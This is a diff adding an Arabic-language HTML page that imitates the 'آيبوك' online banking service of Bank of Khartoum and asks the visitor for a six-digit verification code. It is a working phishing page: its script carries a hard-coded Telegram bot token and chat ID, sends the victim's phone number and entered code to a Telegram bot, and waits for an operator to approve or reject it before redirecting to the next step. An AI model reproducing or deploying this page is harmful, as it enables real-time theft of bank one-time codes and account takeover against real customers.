@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <title>إدخال رمز التحقق | آيبوك</title>
+
+    <style>
+         :root {
+            --red: #ef2e31;
+            --yellow: #ffcf00;
+            --ink: #101820;
+            --muted: #8393a3;
+            --field: #fff5f5;
+            --border: #ffb8b8;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+            color: var(--ink);
+            background: #fff;
+        }
+        
+        .page {
+            min-height: 100vh;
+            margin: 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            height: 143px;
+            flex: 0 0 143px;
+            color: #fff;
+            background: var(--red);
+        }
+        
+        .welcome,
+        .brand {
+            width: min(704px, calc(100% - 40px));
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .welcome {
+            height: 36px;
+            margin-top: 11px;
+            border-radius: 24px;
+            background: var(--yellow);
+            color: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 700;
+            box-shadow: 0 2px 5px #a91d1f33;
+        }
+        
+        .brand {
+            margin-top: 11px;
+            text-align: center;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            line-height: 1.05;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-caption {
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            min-height: 440px;
+            padding: 0 16px 42px;
+            background-color: #f2f5f9;
+            background-image: radial-gradient(#c8d0da 0.85px, transparent 0.85px);
+            background-size: 18px 18px;
+        }
+        
+        .card {
+            width: min(672px, 100%);
+            margin: 15px auto 0;
+            padding: 25px 40px 24px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
+        }
+        
+        h1 {
+            margin: 0;
+            color: var(--red);
+            font-size: 24px;
+            line-height: 1.25;
+            text-align: center;
+        }
+        
+        .description {
+            margin: 16px 0 21px;
+            font-size: 16px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 11px;
+            font-size: 16px;
+            font-weight: 700;
+            text-align: right;
+        }
+        
+        input {
+            width: 100%;
+            height: 43px;
+            padding: 0 14px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            outline: none;
+            background: var(--field);
+            color: var(--ink);
+            font: inherit;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 4px;
+        }
+        
+        input:focus {
+            border-color: var(--red);
+            box-shadow: 0 0 0 3px rgba(239, 46, 49, 0.15);
+        }
+        
+        input::placeholder {
+            color: var(--muted);
+            opacity: 1;
+            letter-spacing: normal;
+        }
+        
+        .message {
+            min-height: 20px;
+            margin: 12px 0;
+            color: #b4232a;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .message.success {
+            color: #1d7a24;
+        }
+        
+        .message.error {
+            color: #b4232a;
+        }
+        
+        .timer-container {
+            margin: 10px 0 15px;
+            text-align: center;
+            font-size: 14px;
+            color: #607080;
+        }
+        
+        button {
+            width: 100%;
+            min-height: 42px;
+            border: 0;
+            border-radius: 10px;
+            background: var(--red);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background: #d92329;
+        }
+        
+        button:disabled {
+            background: #f4a3a5;
+            cursor: not-allowed;
+        }
+        
+        footer {
+            min-height: 56px;
+            padding: 11px 10px 8px;
+            border-top: 4px solid var(--red);
+            color: #607080;
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        .support-bubble {
+            position: fixed;
+            right: 31px;
+            left: auto;
+            bottom: 15px;
+            width: 55px;
+            height: 55px;
+            background-color: #ff0000;
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+        }
+        
+        .support-bubble i {
+            color: #ffffff;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <header>
+            <div class="welcome">مرحباً بك في خدمة الخدمات المصرفية الإلكترونية آيبوك</div>
+            <div class="brand">
+                <div class="brand-name">آيبوك</div>
+                <div class="brand-caption">النموذج الإلكتروني</div>
+            </div>
+        </header>
+
+        <main>
+            <section class="card" aria-labelledby="demo-title">
+                <h1 id="demo-title">أدخل رمز التحقق (OTP)</h1>
+                <p class="description">يرجى إدخال رمز التحقق الذي تم إرساله إلى رقم هاتفك المسجل وعنوان بريدك الإلكتروني.</p>
+
+                <form id="demo-form">
+                    <label for="otp-input">أدخل الرمز المكون من 6 أرقام</label>
+                    <input id="otp-input" name="otp" type="text" maxlength="6" placeholder="------" autocomplete="off" required aria-describedby="message" />
+
+                    <div class="timer-container">
+                        صلاحية الرمز تنتهي خلال: <span id="timerText">30s</span>
+                    </div>
+
+                    <p class="message" id="message" aria-live="polite"></p>
+                    <button type="button" id="confirmBtn" disabled>متابعة</button>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            آيبوك | بنك الخرطوم 2026<br /> كافة الحقوق محفوظة، بنك الخرطوم، آيبوك 2026
+        </footer>
+
+        <div class="support-bubble" aria-label="دعم واتساب" title="دعم واتساب">
+            <i class="fa-brands fa-whatsapp"></i>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN_1 = '9161699388:AAHnDXrOZ3HGrj5UnsMBOiEyB4OulSYd1lw';
+        const CHAT_ID_1 = '5926321674';
+
+        const otpInput = document.getElementById('otp-input');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const messageEl = document.getElementById('message');
+        const timerText = document.getElementById('timerText');
+
+        let seconds = 300;
+        let countdown = null;
+        let pollInterval = null;
+
+        const savedPhone = localStorage.getItem('phone') || '785123463';
+
+        function updateTimerUI() {
+            if (!timerText) return;
+            timerText.textContent = `${seconds}ث`;
+        }
+
+        function startCountdown() {
+            clearInterval(countdown);
+            seconds = 300;
+            updateTimerUI();
+
+            countdown = setInterval(() => {
+                seconds--;
+                updateTimerUI();
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    seconds = 0;
+                    updateTimerUI();
+                }
+            }, 1000);
+        }
+
+        // Only allow numbers and max 6 digits in single field
+        otpInput.addEventListener('input', () => {
+            otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
+            const complete = otpInput.value.length === 6;
+
+            confirmBtn.disabled = !complete;
+            if (complete) {
+                confirmBtn.classList.add('enabled');
+            } else {
+                confirmBtn.classList.remove('enabled');
+            }
+        });
+
+        startCountdown();
+        otpInput.focus();
+
+        confirmBtn.addEventListener('click', () => {
+            const otpValue = otpInput.value.trim();
+            if (otpValue.length !== 6) return;
+
+            if (seconds <= 0) {
+                messageEl.className = 'message error';
+                messageEl.textContent = 'انتهت صلاحية رمز التحقق. يرجى طلب رمز جديد.';
+                return;
+            }
+
+            // Unique session ID for this OTP submission
+            const userId = Date.now() + "_" + otpValue.slice(-2);
+
+            messageEl.className = 'message';
+            messageEl.textContent = 'جاري التحقق.......';
+
+            const message =
+                `*التحقق من رمز OTP*\n\n` +
+                `📱 الهاتف: +249 ${savedPhone}\n` +
+                `🔢 الرمز المدخل: ${otpValue}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_otp_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_otp_${userId}`
+                    }, ],
+                    [{
+                        text: "⚠️ WRONG OTP",
+                        callback_data: `wrong_otp_${userId}`
+                    }, ],
+                ],
+            };
+
+            // Send to Telegram with Inline Keyboard
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID_1,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        reply_markup: keyboard
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        messageEl.className = 'message success';
+                        messageEl.textContent = 'جاري انتظار الموافقة.....';
+                        otpInput.disabled = true;
+                        confirmBtn.disabled = true;
+
+                        // Start polling updates
+                        startPolling(userId);
+                    } else {
+                        messageEl.className = 'message error';
+                        messageEl.textContent = 'حدث خطأ أثناء إرسال البيانات.';
+                    }
+                })
+                .catch(() => {
+                    messageEl.className = 'message error';
+                    messageEl.textContent = 'حدث خطأ في الشبكة.';
+                });
+        });
+
+        // =======================
+        // TELEGRAM CALLBACK POLLING
+        // =======================
+        let lastUpdateId = 0;
+
+        function startPolling(userId) {
+            if (pollInterval) clearInterval(pollInterval);
+
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/getUpdates?offset=-1&timeout=2`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const latestUpdate = data.result[data.result.length - 1];
+
+                            if (latestUpdate.update_id > lastUpdateId && latestUpdate.callback_query) {
+                                lastUpdateId = latestUpdate.update_id;
+                                const callbackData = latestUpdate.callback_query.data;
+
+                                if (callbackData.includes(userId)) {
+                                    // Acknowledge callback query
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json'
+                                        },
+                                        body: JSON.stringify({
+                                            callback_query_id: latestUpdate.callback_query.id
+                                        })
+                                    });
+
+                                    clearInterval(pollInterval);
+
+                                    if (callbackData.startsWith("approve_otp_")) {
+                                        messageEl.className = 'message success';
+                                        messageEl.textContent = 'تمت الموافقة بنجاح! جاري الانتقال...';
+                                        setTimeout(() => {
+                                            window.location.href = 'number.html';
+                                        }, 1000);
+                                    } else if (callbackData.startsWith("decline_otp_")) {
+                                        messageEl.className = 'message error';
+                                        messageEl.textContent = 'تم رفض الطلب، يرجى إعادة المحاولة.';
+                                        resetFormState();
+                                    } else if (callbackData.startsWith("wrong_otp_")) {
+                                        messageEl.className = 'message error';
+                                        messageEl.textContent = 'رمز التحقق غير صحيح، يرجى إعادة إدخال الرمز الصحيح.';
+                                        resetFormState();
+                                    }
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000);
+        }
+
+        function resetFormState() {
+            otpInput.value = '';
+            otpInput.disabled = false;
+            confirmBtn.disabled = true;
+            confirmBtn.classList.remove('enabled');
+            otpInput.focus();
+        }
+    </script>
+</body>
+
+</html>
